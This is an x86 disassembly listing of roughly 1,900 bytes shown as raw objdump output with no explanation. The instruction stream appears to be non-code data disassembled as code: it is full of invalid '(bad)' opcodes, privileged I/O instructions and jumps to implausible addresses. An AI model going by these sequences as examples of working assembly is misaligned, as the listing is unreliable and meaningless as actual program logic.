  41ed69:	mov    edx,0x54e8151
  41ed6e:	or     ebp,eax
  41ed70:	push   esi
  41ed71:	jb     0x41ed56
  41ed73:	xlat   BYTE PTR ds:[ebx]
  41ed74:	loop   0x41ed83
  41ed76:	cmp    BYTE PTR [ecx+0x25],cl
  41ed79:	(bad)
  41ed7d:	pop    ss
  41ed7e:	xchg   ebx,eax
  41ed7f:	xor    ebp,0x473b671
  41ed85:	jmp    0xe55e38d
  41ed8a:	xchg   ebx,eax
  41ed8b:	shl    BYTE PTR [ebx],cl
  41ed8d:	ror    BYTE PTR [ebx+ebx*2-0x250f89e9],1
  41ed94:	shl    DWORD PTR [ecx],0x29
  41ed97:	leave  
  41ed98:	adc    eax,0x12a70789
  41ed9d:	push   esp
  41ed9e:	dec    esp
  41ed9f:	or     dl,BYTE PTR [eax]
  41eda1:	(bad)  
  41eda2:	sub    ebp,DWORD PTR [bp+si]
  41eda5:	and    BYTE PTR [eax+0x6684bddc],bl
  41edab:	push   es
  41edac:	or     al,0x11
  41edae:	add    ebx,ebp
  41edb0:	loope  0x41ed73
  41edb2:	imul   ebp,DWORD PTR [ebx],0xe33866c3
  41edb8:	ret    
  41edb9:	jp     0x41ed7a
  41edbb:	inc    edx
  41edbc:	ins    BYTE PTR es:[edi],dx
  41edbd:	xchg   esi,eax
  41edbe:	jge    0x41ee2b
  41edc0:	cmp    dl,dh
  41edc2:	test   ch,dl
  41edc4:	adc    al,BYTE PTR [ebx+0x737af772]
  41edca:	adc    eax,0x8ee5054d
  41edcf:	addr16 xchg ecx,eax
  41edd1:	ins    BYTE PTR es:[edi],dx
  41edd2:	xchg   edx,eax
  41edd3:	fldcw  WORD PTR [edi+eiz*1]
  41edd6:	xchg   ecx,eax
  41edd7:	pop    ebp
  41edd8:	cmp    DWORD PTR [ebx+ebp*4+0x43],ebx
  41eddc:	pop    edi
  41eddd:	mov    ecx,0x77679fa1
  41ede3:	cld    
  41ede4:	xor    dh,BYTE PTR [eax+edi*1-0x343570b1]
  41edeb:	sbb    dl,dh
  41eded:	mov    bh,0xf5
  41edef:	dec    edi
  41edf0:	stos   DWORD PTR es:[edi],eax
  41edf1:	sbb    dl,dl
  41edf3:	fldcw  WORD PTR [edx+0x4d]
  41edf6:	or     dl,bl
  41edf8:	repz pop ecx
  41edfa:	mov    bh,0xda
  41edfc:	loop   0x41ede7
  41edfe:	setnp  BYTE PTR [eax-0x6ee2189a]
  41ee05:	fs add al,0x5d
  41ee08:	je     0x41ee36
  41ee0a:	pop    ebp
  41ee0b:	push   0xffffff80
  41ee0d:	inc    edx
  41ee0e:	mov    cl,0x7c
  41ee10:	sti    
  41ee11:	ss sub al,0x22
  41ee14:	sub    DWORD PTR [edi-0x5626fd5d],ebx
  41ee1a:	pop    edi
  41ee1b:	pop    edi
  41ee1c:	arpl   WORD PTR [edx+0x4452e3cb],dx
  41ee22:	lock or esi,DWORD PTR [edx+0x3a70f1b7]
  41ee29:	and    al,BYTE PTR [ebx]
  41ee2b:	and    BYTE PTR [ebx+0x6d],ch
  41ee2e:	jbe    0x41ee0a
  41ee30:	je     0x41ede3
  41ee32:	add    al,0xa4
  41ee34:	pop    ds
  41ee35:	mov    bh,0xa8
  41ee37:	pop    edx
  41ee38:	stos   BYTE PTR es:[edi],al
  41ee39:	pop    ebx
  41ee3a:	cmp    eax,0x579358b
  41ee3f:	inc    ebx
  41ee40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee41:	pop    edx
  41ee42:	aam    0x1a
  41ee44:	scas   al,BYTE PTR es:[edi]
  41ee45:	fiadd  WORD PTR [edi-0x4b]
  41ee48:	jmp    0x259dd0c1
  41ee4d:	or     al,0xd4
  41ee4f:	jecxz  0x41ee85
  41ee51:	test   eax,0x77ac9e9c
  41ee56:	mov    esp,0x29f46e2f
  41ee5b:	xchg   ebp,eax
  41ee5c:	repz pop ss
  41ee5e:	mov    al,0x61
  41ee60:	inc    ebp
  41ee61:	(bad)  
  41ee63:	ja     0x41ee08
  41ee65:	mov    edi,0x892b59ac
  41ee6a:	and    DWORD PTR [ebp+0x7435eb7b],edx
  41ee70:	pop    eax
  41ee71:	into   
  41ee72:	xchg   ecx,eax
  41ee73:	sub    ch,BYTE PTR [edx-0x4466fca3]
  41ee79:	jmp    0xd3b46b09
  41ee7e:	xabort 0x6
  41ee81:	push   esi
  41ee82:	add    DWORD PTR [ebx+0x24],esp
  41ee85:	sbb    BYTE PTR [edi-0x317255fb],dh
  41ee8b:	out    0x92,eax
  41ee8d:	pop    esi
  41ee8e:	inc    ecx
  41ee8f:	shr    BYTE PTR [edx],0xd8
  41ee92:	loop   0x41ee8d
  41ee94:	xchg   ecx,eax
  41ee95:	mov    WORD PTR [edx],?
  41ee97:	add    eax,0x2b8980b3
  41ee9c:	inc    eax
  41ee9e:	out    0x43,al
  41eea0:	push   edx
  41eea1:	sti    
  41eea2:	(bad)  
  41eea3:	in     eax,dx
  41eea4:	int    0x20
  41eea6:	mov    ch,0xe0
  41eea8:	stc    
  41eea9:	dec    ebp
  41eeaa:	sub    eax,0xc438aaa
  41eeaf:	inc    edx
  41eeb0:	mov    BYTE PTR [esi+0x39b26a8f],cl
  41eeb6:	inc    esi
  41eeb7:	jae    0x41ee53
  41eeb9:	cmc    
  41eeba:	push   esp
  41eebb:	and    al,BYTE PTR [ebx]
  41eebd:	pop    eax
  41eebe:	loopne 0x41ee4f
  41eec0:	shr    DWORD PTR [ecx],cl
  41eec2:	cmp    bh,BYTE PTR [esi]
  41eec4:	xor    cl,BYTE PTR [ebx+esi*2-0x6]
  41eec8:	ret    
  41eec9:	and    BYTE PTR [edx+eiz*4-0x43414250],0x56
  41eed1:	stos   BYTE PTR es:[edi],al
  41eed2:	and    dh,ah
  41eed4:	in     al,dx
  41eed5:	fs retf 0xb9f7
  41eed9:	and    edi,DWORD PTR [esp+ebp*8]
  41eedc:	lods   eax,DWORD PTR ds:[esi]
  41eedd:	mov    eax,ds:0xc1cb6507
  41eee2:	push   0x22
  41eee4:	(bad)  
  41eee5:	push   edi
  41eee6:	aas    
  41eee7:	sub    eax,0x531e2ca5
  41eeec:	sar    DWORD PTR [edx],0xe9
  41eeef:	in     al,0xe7
  41eef1:	xchg   ecx,eax
  41eef2:	sbb    BYTE PTR [ecx+0x1f],0x3a
  41eef6:	scas   eax,DWORD PTR es:[edi]
  41eef7:	lock adc ebx,DWORD PTR [ecx+0x30]
  41eefb:	cwde   
  41eefc:	sti    
  41eefd:	mov    esi,0xc084aac9
  41ef02:	mov    gs,WORD PTR [ebp+0x7c6adb98]
  41ef08:	cs stc 
  41ef0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef0b:	inc    esp
  41ef0c:	std    
  41ef0d:	mov    ah,0x20
  41ef0f:	mov    ds:0xdac579de,eax
  41ef14:	pushf  
  41ef15:	out    0x75,eax
  41ef17:	lods   al,BYTE PTR ds:[esi]
  41ef18:	xor    edi,ecx
  41ef1a:	dec    ebp
  41ef1b:	fs adc eax,0x7293ff40
  41ef21:	mov    al,0xf0
  41ef23:	out    dx,eax
  41ef24:	mov    DWORD PTR [ebp*4-0x115d6e05],ebx
  41ef2b:	adc    al,al
  41ef2d:	jnp    0x41ef63
  41ef2f:	add    DWORD PTR [eax+esi*4+0x4322fc8c],edi
  41ef36:	popf   
  41ef37:	add    DWORD PTR [edi],edi
  41ef39:	lea    edx,[eax-0x68]
  41ef3c:	or     eax,0xea9bfd3
  41ef41:	mov    bh,BYTE PTR [eax]
  41ef43:	inc    edi
  41ef44:	mov    BYTE PTR [ebp+0x4b],bl
  41ef47:	xor    BYTE PTR [eax],dl
  41ef49:	cmp    eax,0x7344df91
  41ef4e:	retf   0x4922
  41ef51:	inc    ecx
  41ef52:	dec    esp
  41ef53:	inc    edi
  41ef54:	adc    al,BYTE PTR gs:[edx]
  41ef57:	jnp    0x41ef92
  41ef59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef5a:	pop    ecx
  41ef5b:	and    esi,DWORD PTR [edx+0x7e]
  41ef5e:	jg     0x41ef98
  41ef60:	into   
  41ef61:	test   eax,0x887647f1
  41ef66:	cmp    al,BYTE PTR [esi-0x43990890]
  41ef6c:	or     BYTE PTR [edx+0x4aba795],ah
  41ef72:	cmp    BYTE PTR [eax-0x74],0x81
  41ef76:	dec    esp
  41ef77:	dec    edi
  41ef78:	add    al,0xfa
  41ef7a:	ret    0x2c1d
  41ef7d:	es mov bl,0xc8
  41ef80:	sbb    ch,BYTE PTR [esi+edi*4]
  41ef83:	scas   al,BYTE PTR es:[edi]
  41ef84:	add    ecx,0x29
  41ef87:	add    al,0x36
  41ef89:	outs   dx,BYTE PTR ds:[esi]
  41ef8a:	int3   
  41ef8b:	add    esi,DWORD PTR [edx-0x5d]
  41ef8e:	int    0x16
  41ef90:	pop    ds
  41ef91:	pop    ebx
  41ef92:	in     al,dx
  41ef93:	jl     0x41ef90
  41ef95:	mov    ebx,0x798cab7b
  41ef9a:	ins    BYTE PTR es:[edi],dx
  41ef9b:	into   
  41ef9c:	add    eax,0x7ff5edc4
  41efa1:	pop    edx
  41efa2:	push   esp
  41efa3:	pop    es
  41efa4:	mov    ecx,0x551e7e15
  41efa9:	mov    ds,WORD PTR [ecx+0x70]
  41efac:	and    ebp,DWORD PTR [esi]
  41efae:	dec    ebx
  41efaf:	les    ecx,FWORD PTR [ebp+0x1b]
  41efb2:	cmp    DWORD PTR [ecx*8-0x2229790b],ecx
  41efb9:	xor    BYTE PTR [esp+esi*2+0xa076a38],al
  41efc0:	mov    al,ss:0x241eab99
  41efc6:	and    DWORD PTR [edx+0x2884c3ff],edi
  41efcc:	nop
  41efcd:	pop    edi
  41efce:	or     esp,DWORD PTR [esi+0x1e]
  41efd1:	sub    esi,DWORD PTR [edi]
  41efd3:	or     ah,BYTE PTR [ebx]
  41efd5:	and    cl,dh
  41efd7:	xor    al,0xea
  41efd9:	push   0xfffffff7
  41efdb:	mov    al,ds:0xe9fadd9a
  41efe0:	cmp    DWORD PTR [eax-0x7d],eax
  41efe3:	sbb    cl,ah
  41efe5:	inc    ecx
  41efe6:	or     esp,eax
  41efe8:	mov    edi,0x920ecb09
  41efed:	pop    edx
  41efee:	mov    al,ds:0x18cb26ad
  41eff3:	gs lock das 
  41eff6:	jg     0x41efa9
  41eff8:	fcomp  st(2)
  41effa:	in     eax,0x33
  41effc:	shl    BYTE PTR [esi+0x1d1fb0bc],1
  41f002:	fbstp  TBYTE PTR [eax+0x35f4fa9a]
  41f008:	mov    ah,0x6b
  41f00a:	sbb    dl,BYTE PTR [ebx-0x2a]
  41f00d:	adc    edx,DWORD PTR [eax+0x1eb89792]
  41f013:	stos   DWORD PTR es:[edi],eax
  41f014:	push   es
  41f015:	mov    dh,0x36
  41f017:	aas    
  41f018:	pop    ecx
  41f019:	stos   DWORD PTR es:[edi],eax
  41f01a:	shl    DWORD PTR ds:0x1a495ad5,cl
  41f020:	jns    0x41efbd
  41f022:	or     eax,DWORD PTR [esi]
  41f024:	call   0x5c7b67a5
  41f029:	popf   
  41f02a:	add    eax,0xa3ebbfa4
  41f02f:	and    edi,DWORD PTR [eax+0x49]
  41f032:	lods   eax,DWORD PTR ds:[esi]
  41f033:	fistp  DWORD PTR [eax-0x8]
  41f036:	(bad)  
  41f038:	inc    ecx
  41f039:	jae    0x41f099
  41f03b:	fstp   DWORD PTR [esi-0x4773167]
  41f041:	pop    es
  41f042:	dec    eax
  41f043:	mov    eax,ds:0x327a415c
  41f048:	adc    BYTE PTR [ecx],ch
  41f04a:	jns    0x41f092
  41f04c:	test   al,0xf7
  41f04e:	fcom   DWORD PTR [esi+0x343d5af7]
  41f054:	dec    esi
  41f055:	js     0x41f044
  41f057:	mov    cl,0x44
  41f059:	ds inc ebp
  41f05b:	icebp  
  41f05c:	cdq    
  41f05d:	and    eax,0x9e127d32
  41f062:	out    dx,eax
  41f063:	ins    BYTE PTR es:[edi],dx
  41f064:	xchg   esp,eax
  41f065:	enter  0x9662,0xfb
  41f069:	inc    ebx
  41f06a:	adc    bh,BYTE PTR [esi-0x4a]
  41f06d:	lods   eax,DWORD PTR ds:[esi]
  41f06e:	sahf   
  41f06f:	and    eax,0x90ab7cfc
  41f074:	in     al,dx
  41f075:	push   0xffffffa6
  41f077:	xor    eax,0x3acb2ae7
  41f07c:	pop    edi
  41f07d:	jmp    0x239b9894
  41f082:	ins    BYTE PTR es:[edi],dx
  41f083:	adc    eax,0x521da90a
  41f088:	loopne 0x41f0d9
  41f08a:	test   DWORD PTR [edi-0x4d],ebx
  41f08d:	ret    
  41f08e:	xchg   edx,eax
  41f08f:	cmp    al,0x5c
  41f091:	fadd   QWORD PTR [ebx]
  41f093:	in     eax,0x3b
  41f095:	jns    0x41f052
  41f097:	loop   0x41f100
  41f099:	adc    al,0x7e
  41f09b:	xchg   esp,eax
  41f09c:	mov    cl,0x78
  41f09e:	retf   
  41f09f:	add    al,0xf2
  41f0a1:	aaa    
  41f0a2:	mov    cl,0x26
  41f0a4:	xor    ch,ch
  41f0a6:	jnp    0x41f094
  41f0a8:	add    edx,DWORD PTR [esi-0x63]
  41f0ab:	pop    ds
  41f0ac:	aas    
  41f0ad:	outs   dx,BYTE PTR ds:[esi]
  41f0ae:	call   0x45df:0x6443d9e9
  41f0b5:	div    ebx
  41f0b7:	test   ebx,edi
  41f0b9:	mov    edi,0xcaa77f0e
  41f0be:	adc    DWORD PTR [edi],ebp
  41f0c0:	or     edx,DWORD PTR [ebp-0x7d12df82]
  41f0c6:	leave  
  41f0c7:	xlat   BYTE PTR ds:[ebx]
  41f0c8:	jns    0x41f0ba
  41f0ca:	mov    DWORD PTR [eax+0x7c],esp
  41f0cd:	sbb    ecx,eax
  41f0cf:	ins    BYTE PTR es:[edi],dx
  41f0d0:	sbb    BYTE PTR [edx+0x7f],0x15
  41f0d4:	daa    
  41f0d5:	shl    BYTE PTR [eax],0x4e
  41f0d8:	or     BYTE PTR [esi],bl
  41f0da:	sar    BYTE PTR fs:[ebx],1
  41f0dd:	xchg   BYTE PTR [edx-0x5],ah
  41f0e0:	and    al,0xb7
  41f0e2:	sub    ch,BYTE PTR [eax+0x583f2594]
  41f0e8:	jmp    0x965463db
  41f0ed:	pop    eax
  41f0ee:	push   ebp
  41f0ef:	adc    bl,BYTE PTR [edx-0x41d46408]
  41f0f5:	inc    esi
  41f0f6:	or     ah,0x95
  41f0f9:	(bad)  
  41f0fa:	and    esp,DWORD PTR [ebx+0x3]
  41f0fd:	xchg   ebx,eax
  41f0fe:	xor    BYTE PTR [edx+0x76866048],al
  41f104:	dec    edi
  41f105:	dec    ecx
  41f106:	jp     0x41f0f2
  41f108:	stc    
  41f109:	int    0x34
  41f10b:	daa    
  41f10c:	packsswb mm1,QWORD PTR [edi+edx*4+0x61]
  41f111:	sub    ebx,esp
  41f113:	xor    eax,0xa9c6e87c
  41f118:	js     0x41f10e
  41f11a:	push   ebx
  41f11b:	mov    WORD PTR [esi+0x6712a87e],?
  41f121:	or     al,0xe7
  41f123:	or     DWORD PTR [edi],0xfffffff6
  41f126:	gs sbb al,bh
  41f129:	popf   
  41f12a:	xor    BYTE PTR [ebx-0x789a9239],cl
  41f130:	not    BYTE PTR [ecx+0x51]
  41f133:	(bad)  
  41f134:	lods   al,BYTE PTR ds:[esi]
  41f135:	aaa    
  41f136:	or     DWORD PTR [ebx+0x39957559],ebx
  41f13c:	outs   dx,BYTE PTR ds:[esi]
  41f13d:	leave  
  41f13e:	out    dx,eax
  41f13f:	test   eax,0xd004e926
  41f144:	mov    edx,esp
  41f146:	sbb    ebp,DWORD PTR [edx+esi*8-0x2e]
  41f14a:	mov    ebp,0xe07dec80
  41f14f:	xchg   ebx,eax
  41f150:	mov    eax,0x415bbca7
  41f155:	mov    cl,0xed
  41f157:	std    
  41f158:	dec    esi
  41f159:	xlat   BYTE PTR ds:[ebx]
  41f15a:	dec    esi
  41f15b:	aad    0x68
  41f15d:	mov    cl,0x39
  41f15f:	(bad)  [edx+0x2c]
  41f162:	mov    ecx,0x4c323fec
  41f167:	imul   ebx,DWORD PTR [edx],0x44065b98
  41f16d:	fbld   TBYTE PTR [ebp-0x11]
  41f170:	das    
  41f171:	cmp    ebp,DWORD PTR [ebx+0x3dba2c07]
  41f177:	xor    DWORD PTR [ecx-0x57e2e825],esp
  41f17d:	xchg   ebx,eax
  41f17e:	or     al,0x91
  41f180:	sar    BYTE PTR [ecx-0x1f],cl
  41f183:	retf   
  41f184:	int    0x53
  41f186:	out    0xfc,eax
  41f188:	loopne 0x41f111
  41f18a:	adc    bh,bh
  41f18c:	jo     0x41f14a
  41f18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f18f:	stc    
  41f190:	outs   dx,DWORD PTR ds:[esi]
  41f191:	int    0xe9
  41f193:	push   0x6d5f24d7
  41f198:	aad    0xc8
  41f19a:	sbb    DWORD PTR [edx],edx
  41f19c:	pop    edx
  41f19d:	inc    ecx
  41f19e:	bound  ebx,QWORD PTR [ebx]
  41f1a0:	or     edi,ecx
  41f1a2:	xchg   esi,eax
  41f1a3:	mov    ebx,0x61e0d658
  41f1a8:	sbb    ebp,DWORD PTR [eax-0x59ac3aa]
  41f1ae:	mov    eax,ecx
  41f1b0:	mov    DWORD PTR [ecx-0x25],edx
  41f1b3:	sbb    BYTE PTR [esi+edx*2-0x5c4913b],dh
  41f1ba:	ins    BYTE PTR es:[edi],dx
  41f1bb:	adc    al,BYTE PTR [edx+0x34b4f732]
  41f1c1:	mov    DWORD PTR [eax],ebx
  41f1c3:	push   esi
  41f1c4:	cmp    al,0xe9
  41f1c6:	xchg   esp,eax
  41f1c7:	xchg   ecx,eax
  41f1c8:	cdq    
  41f1c9:	mov    ds:0xf79b9fbe,eax
  41f1ce:	adc    dl,cl
  41f1d0:	icebp  
  41f1d1:	fsub   QWORD PTR [esi-0xf87ec2f]
  41f1d7:	ins    DWORD PTR es:[edi],dx
  41f1d8:	mov    bh,0x4a
  41f1da:	xor    DWORD PTR [ebp+0x797b6905],esp
  41f1e0:	mov    bl,0x7f
  41f1e2:	cmp    BYTE PTR [eax+edx*2],al
  41f1e5:	pop    esi
  41f1e6:	jno    0x41f1a8
  41f1e8:	aaa    
  41f1e9:	and    esi,eax
  41f1eb:	jge    0x41f183
  41f1ed:	cmc    
  41f1ee:	xor    bl,BYTE PTR [esi-0x75f5af31]
  41f1f4:	mov    fs,esi
  41f1f6:	cdq    
  41f1f7:	cmp    al,0x9d
  41f1f9:	outs   dx,BYTE PTR ds:[esi]
  41f1fa:	ficomp WORD PTR ds:0x785ffa3a
  41f200:	or     ch,ch
  41f202:	ficomp DWORD PTR [edi+0x67]
  41f205:	pop    eax
  41f206:	or     dl,0xb5
  41f209:	push   edi
  41f20a:	aaa    
  41f20b:	mov    edi,0x87f6fbc1
  41f210:	ja     0x41f22c
  41f212:	pop    esp
  41f213:	mov    ebx,0xc2703266
  41f218:	iret   
  41f219:	test   BYTE PTR [esi],al
  41f21b:	js     0x41f21c
  41f21d:	ret    0xd333
  41f220:	pushf  
  41f221:	mov    bl,0xf2
  41f223:	xchg   edi,eax
  41f224:	sub    eax,0x85974b94
  41f229:	inc    ebp
  41f22a:	aaa    
  41f22b:	ficomp WORD PTR [esi-0x18]
  41f22e:	inc    edi
  41f22f:	nop
  41f230:	fild   WORD PTR [ecx-0x54ac9c4f]
  41f236:	shl    DWORD PTR ds:0x76e34df2,cl
  41f23c:	ret    
  41f23d:	mov    BYTE PTR [edx],dh
  41f23f:	ficom  DWORD PTR [esi-0xe1937b2]
  41f245:	push   0xffffffd6
  41f247:	sbb    al,0xb
  41f24a:	fidivr WORD PTR [eax]
  41f24c:	sub    BYTE PTR [ecx-0x68069a9f],bl
  41f252:	mov    DWORD PTR [esi+esi*2-0x65],edi
  41f256:	repz int3 
  41f258:	sub    DWORD PTR [esi],0x6e765f25
  41f25e:	jle    0x41f2aa
  41f260:	add    DWORD PTR [ebp-0x1d816e72],0xf
  41f267:	stc    
  41f268:	jmp    0x41f20e
  41f26a:	in     eax,0xe7
  41f26c:	sub    al,0xa7
  41f26e:	jg     0x41f201
  41f270:	or     DWORD PTR [edx+0x3433f518],edx
  41f276:	call   0x69d2d623
  41f27b:	or     al,BYTE PTR [ebx]
  41f27d:	push   edi
  41f27e:	lods   al,BYTE PTR ds:[esi]
  41f27f:	lea    esp,[ebx+eax*8]
  41f282:	ret    0x437d
  41f285:	loopne 0x41f23a
  41f287:	popf   
  41f288:	fwait
  41f289:	nop
  41f28a:	sbb    edi,DWORD PTR [ecx+edx*2-0x3]
  41f28e:	mov    WORD PTR [ebx+0x3a],ds
  41f291:	sub    dl,0xc4
  41f294:	add    DWORD PTR [esi],ebx
  41f296:	add    ecx,DWORD PTR [ecx-0x435e63a0]
  41f29c:	jle    0x41f30b
  41f29e:	cmp    bh,BYTE PTR ds:0x66b50139
  41f2a4:	mov    bl,0x72
  41f2a6:	mov    bl,0x57
  41f2a8:	sbb    BYTE PTR [edi+edx*2-0x26b95877],bl
  41f2af:	ja     0x41f2de
  41f2b1:	or     esi,DWORD PTR [eax-0x33c9c09f]
  41f2b7:	dec    edx
  41f2b8:	cld    
  41f2b9:	jg     0x41f2fc
  41f2bb:	mov    ebx,0x10a5b9c7
  41f2c0:	lahf   
  41f2c1:	fisttp WORD PTR [eax+0x1d99b1e6]
  41f2c7:	lods   eax,DWORD PTR ds:[esi]
  41f2c8:	and    al,0x21
  41f2ca:	in     eax,dx
  41f2cb:	or     ah,BYTE PTR [eax]
  41f2cd:	les    ebx,FWORD PTR [ebx+0x31]
  41f2d0:	imul   BYTE PTR [ebx-0x3d]
  41f2d3:	xor    DWORD PTR [eax-0x32],edx
  41f2d6:	xchg   ebx,esp
  41f2d8:	sbb    al,0x5f
  41f2da:	push   ecx
  41f2db:	test   DWORD PTR [eax-0x27],esi
  41f2de:	cmp    ebx,DWORD PTR [ebp+0x2fc83bd9]
  41f2e4:	add    al,0x4c
  41f2e6:	rcl    BYTE PTR [edi*4+0x5fbc76d6],0xe6
  41f2ee:	push   ecx
  41f2ef:	mov    ds:0xb2e5679,al
  41f2f4:	inc    ebx
  41f2f5:	dec    esp
  41f2f6:	icebp  
  41f2f7:	jecxz  0x41f2a5
  41f2f9:	mov    dl,0x7b
  41f2fb:	mov    eax,0xbe0b9b6c
  41f300:	imul   edx,DWORD PTR [ebx-0x4fd3a479],0xfffffff6
  41f307:	mov    edx,0x5cd3a9f0
  41f30c:	mov    edi,0x8c23a098
  41f311:	scas   eax,DWORD PTR es:[edi]
  41f312:	jp     0x41f2ef
  41f314:	inc    ebx
  41f315:	push   ecx
  41f316:	pop    ebx
  41f317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f318:	adc    eax,0x1c523180
  41f31d:	les    esi,FWORD PTR [ebx-0x3011f9f8]
  41f323:	sub    bh,cl
  41f325:	test   BYTE PTR ds:0x67de775d,cl
  41f32b:	les    ebp,FWORD PTR ds:0x21c9c3e9
  41f331:	xchg   edi,eax
  41f332:	adc    DWORD PTR ds:0x9750b342,edi
  41f338:	fisub  DWORD PTR [esi]
  41f33a:	cmc    
  41f33b:	xor    al,0x94
  41f33d:	iret   
  41f33e:	add    cl,ch
  41f340:	push   ecx
  41f341:	test   DWORD PTR [edx],esi
  41f343:	push   es
  41f344:	add    DWORD PTR [ecx+0x41],edx
  41f347:	lock aad 0xd4
  41f34a:	loop   0x41f374
  41f34c:	dec    ebx
  41f34d:	and    BYTE PTR [eax-0x53dc8d6c],0x7e
  41f354:	push   0x8ef0a99e
  41f359:	adc    al,0x99
  41f35b:	jno    0x41f339
  41f35d:	(bad)  
  41f35e:	mov    bl,0x26
  41f360:	mov    ?,edi
  41f362:	inc    esp
  41f363:	es cmp edi,esi
  41f366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f367:	jle    0x41f36a
  41f369:	or     al,0xf2
  41f36b:	das    
  41f36c:	(bad)  
  41f36d:	cmp    al,0x1a
  41f36f:	xchg   esi,eax
  41f370:	mov    DWORD PTR ds:0x37702de0,ebp
  41f376:	jmp    0x382929a3
  41f37b:	enter  0xc7a,0x14
  41f37f:	sbb    eax,0xef9aa773
  41f384:	enter  0xf632,0xd7
  41f388:	mov    ds:0x89f810d,al
  41f38d:	in     eax,0x62
  41f38f:	loope  0x41f36e
  41f391:	sbb    cl,ch
  41f393:	mov    ebp,0xc60b35d0
  41f398:	out    dx,eax
  41f399:	or     bl,BYTE PTR [esi+0x36]
  41f39c:	lods   eax,DWORD PTR ds:[esi]
  41f39d:	jg     0x41f329
  41f39f:	jae    0x41f341
  41f3a1:	push   eax
  41f3a2:	les    esp,FWORD PTR [edx-0x47]
  41f3a5:	out    dx,eax
  41f3a6:	imul   ebp,edx,0x976e2b1a
  41f3ac:	cmp    eax,0x4e9c63a4
  41f3b1:	arpl   WORD PTR [ecx+0x3a92006d],bx
  41f3b7:	xchg   edi,eax
  41f3b8:	dec    ebx
  41f3b9:	mov    dl,0x9a
  41f3bb:	ss je  0x41f3c8
  41f3be:	ret    0x3b9d
  41f3c1:	dec    edi
  41f3c2:	sar    BYTE PTR [edx+0x6212a57c],1
  41f3c8:	or     edi,DWORD PTR ds:0xb25ecd36
  41f3ce:	xchg   ebx,eax
  41f3cf:	and    bh,BYTE PTR [edx-0x2600573f]
  41f3d5:	jb     0x41f384
  41f3d7:	cs xchg esp,eax
  41f3d9:	aaa    
  41f3da:	fsub   QWORD PTR [esi]
  41f3dc:	add    eax,0xe4f06f48
  41f3e1:	and    al,0x3f
  41f3e3:	cs stc 
  41f3e5:	push   ecx
  41f3e6:	mov    esp,0x7003c377
  41f3eb:	sub    al,0x4d
  41f3ed:	adc    al,0x33
  41f3ef:	push   edi
  41f3f0:	retf   0x9fa7
  41f3f3:	ins    BYTE PTR es:[edi],dx
  41f3f4:	push   ebx
  41f3f5:	loope  0x41f432
  41f3f7:	test   eax,0x9e2ea4e4
  41f3fc:	or     edx,DWORD PTR [ecx-0x26]
  41f3ff:	popf   
  41f400:	mov    ah,0x68
  41f402:	fwait
  41f403:	mov    dl,0x1b
  41f405:	mov    ecx,0xa6af3491
  41f40a:	ss jg  0x41f467
  41f40d:	mov    ah,0x6b
  41f40f:	push   ebp
  41f410:	xor    BYTE PTR [ecx],cl
  41f412:	or     ecx,esi
  41f414:	stos   DWORD PTR es:[edi],eax
  41f415:	mov    bh,0x94
  41f417:	mov    edi,0x31974511
  41f41c:	nop
  41f41d:	or     al,0xfd
  41f41f:	retf   
  41f420:	dec    edx
  41f421:	pop    esi
  41f422:	inc    ecx
  41f423:	aam    0xd5
  41f425:	xchg   edi,eax
  41f426:	and    DWORD PTR [ecx+edx*2-0x47d58f1c],ecx
  41f42d:	stos   DWORD PTR es:[edi],eax
  41f42e:	bound  ebp,QWORD PTR [edx+0x4523cf1]
  41f434:	mov    ss,WORD PTR [edi-0x1a3c7c5b]
  41f43a:	pop    esp
  41f43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f43c:	rcr    bh,1
  41f43e:	fadd   st,st(5)
  41f440:	adc    al,al
  41f442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f443:	pop    edx
  41f444:	sbb    edi,edx
  41f446:	retf   0x6de7
  41f449:	adc    ah,dh
  41f44b:	ret    
  41f44c:	and    ah,BYTE PTR [ecx-0x653e1e95]
  41f452:	cmp    al,0x97
  41f454:	mov    ds:0x1c3fccc1,eax
  41f459:	push   0x1fe394a1
  41f45e:	fs pop edi
  41f460:	lahf   
  41f461:	pop    ds
  41f462:	lods   eax,DWORD PTR ds:[esi]
  41f463:	les    ebx,FWORD PTR [ebx+0x2]
  41f466:	enter  0xd168,0xe2
  41f46a:	loop   0x41f40f
  41f46c:	cmp    eax,DWORD PTR [edi]
  41f46e:	test   al,0x11
  41f470:	ins    DWORD PTR es:[edi],dx
  41f471:	dec    edi
  41f472:	sbb    ecx,DWORD PTR [ebp+eax*4+0x2c628a23]
  41f479:	aas    
  41f47a:	icebp  
  41f47b:	mov    bl,0xf5
  41f47d:	xchg   edx,eax
  41f47e:	jo     0x41f4cd
  41f480:	loope  0x41f4f4
  41f482:	sbb    al,0xb0
  41f484:	xchg   ebp,eax
  41f485:	mov    cl,al
  41f487:	inc    ebx
  41f488:	scas   eax,DWORD PTR es:[edi]
  41f489:	xchg   ebx,eax
  41f48a:	int3   
  41f48b:	ss out dx,eax
  41f48d:	sti    
  41f48e:	stos   BYTE PTR es:[edi],al
  41f48f:	test   al,0x65
  41f491:	pop    eax
  41f492:	jno    0x41f4cb
  41f494:	inc    edx
  41f495:	pop    esp
  41f496:	fst    st(6)
  41f498:	xor    eax,0x323ad5cb
  41f49d:	or     DWORD PTR [esi+ebx*4-0x531cd068],eax
  41f4a4:	inc    edi
  41f4a5:	rcr    BYTE PTR [ecx+ecx*1],0x3
  41f4a9:	push   esi
  41f4aa:	add    DWORD PTR [ebx+0x2b],edi
  41f4ad:	push   ebp
  41f4ae:	bound  ebx,QWORD PTR [esi+0x36160b01]
  41f4b4:	loope  0x41f46c
  41f4b6:	in     eax,dx
  41f4b7:	scas   al,BYTE PTR es:[edi]
  41f4b8:	lods   al,BYTE PTR ds:[esi]
  41f4b9:	loop   0x41f487
  41f4bb:	or     BYTE PTR [esp+eiz*8],dh
  41f4be:	outs   dx,DWORD PTR ds:[esi]
  41f4bf:	into   
  41f4c0:	push   0xce83c46e
  41f4c5:	mov    cl,0x74
  41f4c7:	push   eax
  41f4c8:	dec    edx
  41f4c9:	test   BYTE PTR [si+0x65c0],ch
  41f4ce:	and    esp,ebx
  41f4d0:	pop    esp
